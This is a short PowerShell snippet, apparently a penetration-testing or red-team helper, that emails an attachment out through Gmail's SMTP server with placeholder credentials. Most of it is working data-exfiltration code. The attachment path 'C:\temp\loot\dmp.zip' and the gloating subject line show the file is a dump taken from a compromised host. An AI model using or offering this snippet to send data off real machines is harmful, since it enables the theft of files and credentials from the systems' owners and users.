# If you ever need to email to yourself via Powershell
#
$From = "some@email.com"
$Creds = New-Object Management.Automation.PSCredential "some@email.com", ("YOUR-PASSWORD-HERE" | ConvertTo-SecureString -AsPlainText -Force)
$To = "you@your.com"
$Attachment = "C:\temp\loot\dmp.zip"
$Subject = "Muwahahhah!!"
$Body = "Here's a message"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $Creds -Attachments $Attachment
